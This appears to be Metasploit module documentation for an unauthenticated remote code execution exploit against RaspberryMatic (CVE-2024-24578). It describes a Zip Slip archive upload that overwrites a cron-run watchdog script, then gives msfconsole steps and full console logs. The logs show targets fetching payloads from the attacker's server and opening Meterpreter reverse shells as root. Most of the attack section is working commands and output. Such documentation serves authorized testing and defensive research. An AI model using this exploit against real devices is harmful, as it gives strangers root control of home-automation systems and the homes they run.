## Vulnerable Application
RaspberryMatic / OCCU contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple issues within
the Java based HMIPServer.jar component. The webui allows for Firmware uploads which can be reached through the URL
`/pages/jpages/system/DeviceFirmware/addFirmware`.
This allows an unauthenticated attacker to upload a malicious .tgz archive to the server, which will be automatically
extracted without any further checks. As this entry can contain ../sequences, it is possible to break out of the predefined
temp directory and write files to other locations outside this path.

This vulnerability is commonly known as the Zip Slip vulnerability and can be used to overwrite arbitrary files on the main
filesystem. It is therefore possible to overwrite the watchdog script with a malicious payload in `/usr/local/addons/mediola/bin/`,
which will be executed every five minutes through a cron job where attackers can gain remote code execution as root user,
allowing a full system compromise.

RaspberryMatic versions <= `3.73.9.20240130` are vulnerable.

The following releases were tested.

**RaspberryMatic Releases:**
* RaspberryMatic v3.73.9 (OVA image)
* RaspberryMatic v3.65.8 (Raspberry Pi4 Model B image)

## Installation steps to install RaspberryMatic OVA image
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download [RaspberryMatic OVA](https://github.com/jens-maus/RaspberryMatic/releases/tag/3.73.9.20240130).
* Install the OVA image in your virtualization engine.
* When installed, configure the VM appliance to your needs using the menu options via the `webui`.
* Boot up the VM and should be able to access the RaspberryMatic appliance via the `webui` via `http://your_ip/`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/raspberrymatic_unauth_rce_cve_2024_24578`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=Unix/Linux Command, 1=Linux Dropper (ARM)>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options
No specific options defined.

## Scenarios
```msf
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > info

       Name: RaspberryMatic unauthenticated Remote Code Execution vulnerability through HMServer File Upload.
     Module: exploit/linux/http/raspberrymatic_unauth_rce_cve_2024_24578
   Platform: Unix, Linux
       Arch: cmd, aarch64, armle
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2024-03-16

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  h0ng10 <https://git.hub/h0ng10>

Module side effects:
 ioc-in-logs
 artifacts-on-disk
 config-changes

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Unix/Linux Command
      1   Linux Dropper (ARM support)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                        cs/using-metasploit.html
  RPORT      443              yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The RaspberryMatic endpoint URL
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the
                                       local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  RaspberryMatic / OCCU contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple
  issues within the Java based HMIPServer.jar component. The webui allows for Firmware uploads which can be reached
  through the URL `/pages/jpages/system/DeviceFirmware/addFirmware`.
  This allows an unauthenticated attacker to upload a malicious .tgz archive to the server, which will be
  automatically extracted without any further checks. As this entry can contain ../sequences, it is possible to
  break out of the predefined temp directory and write files to other locations outside this path.

  This vulnerability is commonly known as the Zip Slip vulnerability and can be used to overwrite arbitrary files
  on the main filesystem. It is therefore possible to overwrite the watchdog script with a malicious payload in
  `/usr/local/addons/mediola/bin/`, which will be executed every five minutes through a cron job where attackers
  can gain remote code execution as root user, allowing a full system compromise.

  RaspberryMatic versions <= `3.73.9.20240130` are vulnerable.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2024-24578
  https://attackerkb.com/topics/ywHhBnSObR/cve-2024-24578
  https://github.com/jens-maus/RaspberryMatic/security/advisories/GHSA-q967-q4j8-637h

View the full module info with the info -d command.
```
### RaspberryMatic OVA appliance - Unix/Linux Command target
```msf
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set FETCH_SRVHOST 192.168.201.8
FETCH_SRVHOST => 192.168.201.8
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set FETCH_WRITABLE_DIR /tmp
FETCH_WRITABLE_DIR => /tmp
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.6:443 can be exploited.
[+] The target appears to be vulnerable. RaspberryMatic 3.73.9
[*] Executing Unix/Linux Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Uploading sT2s4fChKUZ.tgz
[*] Waiting 5 minutes for watchdog execution via cron to trigger the RCE.
[*] Sending stage (3045380 bytes) to 192.168.201.6
[*] Restoring original watchdog script.
[*] Meterpreter session 1 opened (192.168.201.8:4444 -> 192.168.201.6:51220) at 2025-01-28 18:00:01 +0000

meterpreter > sysinfo
Computer     : 192.168.201.6
OS           :  (Linux 6.1.74)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/root
meterpreter >
```
### RaspberryMatic Pi4 Model B compute board - Linux Dropper (ARM) Command target
```msf
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set target 1
target => 1
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > set rhosts 192.168.201.10
rhosts => 192.168.201.10
msf6 exploit(linux/http/raspberrymatic_unauth_rce_cve_2024_24578) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.10:443 can be exploited.
[+] The target appears to be vulnerable. RaspberryMatic 3.65.8
[*] Executing Linux Dropper (ARM support) for linux/aarch64/meterpreter_reverse_tcp
[*] Using URL: http://192.168.201.8:8080/4h2lPduH4
[*] Uploading Aarv1CEc.tgz
[*] Waiting 5 minutes for watchdog execution via cron to trigger the RCE.
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Client 192.168.201.10 (Wget/1.21.3) requested /4h2lPduH4
[*] Sending payload to 192.168.201.10 (Wget/1.21.3)
[*] Restoring original watchdog script.
[*] Meterpreter session 2 opened (192.168.201.8:4444 -> 192.168.201.10:34866) at 2025-01-28 18:10:01 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.201.10
OS           :  (Linux 5.15.56)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : aarch64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/root
meterpreter >
```

## Limitations
You have to wait maximum five minutes for a session to allow `cron` to run the malicious watchdog script
containing the payload. Just be patient and wait for the magic to happen ;-)
